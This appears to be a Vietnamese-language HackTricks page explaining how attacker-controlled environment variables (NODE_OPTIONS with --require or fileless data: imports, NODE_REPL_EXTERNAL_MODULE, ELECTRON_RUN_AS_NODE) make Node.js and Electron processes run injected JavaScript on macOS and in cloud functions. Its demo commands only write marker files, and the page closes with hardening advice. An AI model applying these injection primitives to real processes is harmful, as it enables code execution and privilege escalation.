# macOS Node.js Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

Nếu attacker có thể kiểm soát môi trường của một process mà sau đó khởi chạy **Node.js** (trực tiếp bằng binary `node` hoặc thông qua bất kỳ CLI nào dựa trên Node như `npm`, `npx`, `yarn`, `pnpm`, `eslint`, `tsc`, `next`, …), một số biến môi trường sẽ khiến runtime **load và thực thi JavaScript do attacker kiểm soát trước khi chương trình mục tiêu chạy**. Đây là primitive thực thi mã tương đương với các nhóm `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS` trong những runtime khác.

Mã được preload chạy **trong cùng process**, với cùng uid, môi trường, file descriptor và entitlements như tiến trình nạn nhân. Vì vậy, đây là một vector injection/priv-esc hiệu quả khi một process có đặc quyền cao hơn khởi chạy Node với môi trường được kế thừa hoặc chịu ảnh hưởng của attacker.

## `NODE_OPTIONS` — `--require` (dựa trên file)

`NODE_OPTIONS` được phân tích như thể nội dung của nó là các cờ dòng lệnh bổ sung. `--require` (`-r`) preload một module CommonJS **trước** entry point, nên mã cấp cao nhất của module sẽ chạy trước.<sup>[[1]](#references)</sup>

```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```

## `NODE_OPTIONS` — `--import` với URL `data:` (fileless)

Kể từ **Node 20.6**, `--import` chấp nhận URL `data:text/javascript,<code>`, cho phép preload JavaScript ES-module **inline, không cần file trên đĩa hay thư mục module**. Mã phải được **URL-encode đầy đủ** (dấu cách hoặc `#` thô sẽ cắt ngắn data URL và gây ra `SyntaxError`).<sup>[[1]](#references)[[2]](#references)</sup>

```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```

Đây là kỹ thuật bị lạm dụng trên đám mây, ví dụ bằng cách chèn `NODE_OPTIONS` vào cấu hình của hàm AWS Lambda (`lambda:UpdateFunctionConfiguration`, không cần `iam:PassRole`) để chạy code với quyền của execution role.

> [!TIP]
> `NODE_OPTIONS` **không thể** chạy code trực tiếp: các flag như `--eval`/`-e`, `-p` hoặc đường dẫn đến script đều bị từ chối rõ ràng (`node: --eval is not allowed in NODE_OPTIONS`). Thay vào đó, dùng `--require`/`--import` để trỏ đến code.

## `NODE_OPTIONS` — custom loaders / các flag khởi động khác

`NODE_OPTIONS` cũng chấp nhận các flag khác ảnh hưởng đến quá trình khởi động và có tác dụng phụ là chạy code của attacker, chẳng hạn như một ESM loader hook:

```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```

Bất kỳ launcher nào dựa trên Node và khởi chạy tiến trình con `node` thường **truyền tiếp `NODE_OPTIONS`**, vì vậy chỉ cần inject một lần là có thể ảnh hưởng đến toàn bộ toolchain (`npm run …`, `npx`, build tools, test runners, language servers).

## `NODE_REPL_EXTERNAL_MODULE`

Khi Node khởi chạy một REPL tương tác, nó tải module được chỉ định bởi `NODE_REPL_EXTERNAL_MODULE` và thực thi mã cấp cao nhất của module đó. Điều này hữu ích khi nạn nhân khởi chạy shell `node`/`node -i` tương tác (dev tooling, maintenance consoles).<sup>[[3]](#references)</sup>

```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```

> [!WARNING]
> `NODE_REPL_EXTERNAL_MODULE` cố ý bị **bỏ qua** khi dùng cơ chế bảo vệ [`kDisableNodeOptionsEnv`](https://nodejs.org/api/cli.html) để khởi chạy tiến trình con, nhưng REPL tương tác được khởi chạy trực tiếp sẽ sử dụng biến này.

## Electron (`ELECTRON_RUN_AS_NODE`)

Các ứng dụng Electron cung cấp lại toàn bộ runtime Node khi được khởi chạy với **`ELECTRON_RUN_AS_NODE=1`**; khi đó, tất cả các vector `NODE_OPTIONS` ở trên đều áp dụng cho binary Electron (thường được ký/cấp quyền). Xem:

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## Các runtime JS khác

- **Bun** đọc `NODE_OPTIONS` để tương thích và hỗ trợ `--preload` riêng (có thể cấu hình qua `bunfig.toml`).
- **Deno** không sử dụng `NODE_OPTIONS`; thay vào đó, nó yêu cầu các flag rõ ràng (`--import`, `--preload`), vì vậy không dễ bị tấn công qua `NODE_OPTIONS` được kế thừa.

Luôn xác nhận chính xác runtime và phiên bản, vì các flag được chấp nhận thay đổi theo từng bản phát hành.

## Tăng cường bảo mật

- Xóa `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE` và `ELECTRON_RUN_AS_NODE` khỏi môi trường trước khi khởi chạy Node từ ngữ cảnh có đặc quyền cao hơn; khởi chạy tiến trình con với môi trường đã được làm sạch.
- Coi khả năng thiết lập môi trường của mục tiêu (chèn cấu hình, `launchd`/`launchctl setenv`, plist/`EnvironmentVariables`, biến CI, cấu hình Lambda/container) tương đương với thực thi mã trong mọi tiến trình Node mà nó khởi chạy.
- Theo dõi việc thực thi tiến trình để phát hiện các biến này, tương tự như cách [Shield](https://github.com/theevilbit/Shield) cảnh báo về `ELECTRON_RUN_AS_NODE` và các biến chèn dyld.

## References

- [1] [Tài liệu CLI Node.js — `NODE_OPTIONS`, `--require`, `--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` và URL `data:`](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
